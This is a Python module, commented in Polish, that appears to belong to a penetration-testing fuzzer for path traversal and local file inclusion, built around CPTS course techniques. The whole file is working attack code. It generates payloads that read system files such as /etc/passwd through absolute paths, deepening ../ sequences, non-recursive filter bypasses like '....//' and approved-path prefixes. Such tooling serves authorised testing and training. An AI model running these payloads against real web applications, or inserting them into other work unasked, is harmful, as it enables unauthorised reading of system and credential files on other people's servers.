r"""Path traversal — pełny wachlarz bypassów z CPTS.

Pokrywa techniki z modułu File Inclusion:
  * absolutna ścieżka (/etc/passwd),
  * relatywna (../../../etc/passwd) o rosnącej głębokości,
  * prefix bypass (/../../../etc/passwd) — gdy input doklejany po prefiksie,
  * non-recursive filter bypass: ....// , ..././ , ....\/ , ....//// ,
  * approved-path prefix (./languages/../../../etc/passwd),
  * enkoding url / double-url dokładany przez klienta wg configu.
"""
from __future__ import annotations

from collections.abc import Iterator

from .base import BaseModule

# Sekwencje traversalu (prefix budujący jeden poziom "w górę").
# Uwaga: "....\\/" w kodzie to literalne  ....\/  (jeden backslash).
_SEQUENCES = ["../", "....//", "..././", "....\\/", "....////"]

# Prefiksy approved-path, które czasem trzeba przepuścić przed traversalem.
_APPROVED_PREFIXES = ["", "languages/", "./languages/", "lang/"]


class TraversalModule(BaseModule):
    name = "traversal"
    description = "Path traversal + bypassy filtrów/prefiksów/enkodingu"

    def _norm(self, target: str) -> str:
        """Ścieżka względna bez wiodącego / (do doklejania traversalu)."""
        return target.lstrip("/").replace("C:/", "").replace("c:/", "")

    def payloads(self) -> Iterator[str]:
        for target in self.targets():
            rel = self._norm(target)

            # 1) absolutna ścieżka — gdy input trafia wprost do include()
            yield target
            # 2) prefix bypass — wiodący / neutralizuje doklejony prefiks
            yield "/" + rel

            # 3) relatywny traversal: każda sekwencja x głębokość x approved-prefix
            for prefix in _APPROVED_PREFIXES:
                for seq in _SEQUENCES:
                    for depth in range(1, self.cfg.max_depth + 1):
                        yield prefix + seq * depth + rel
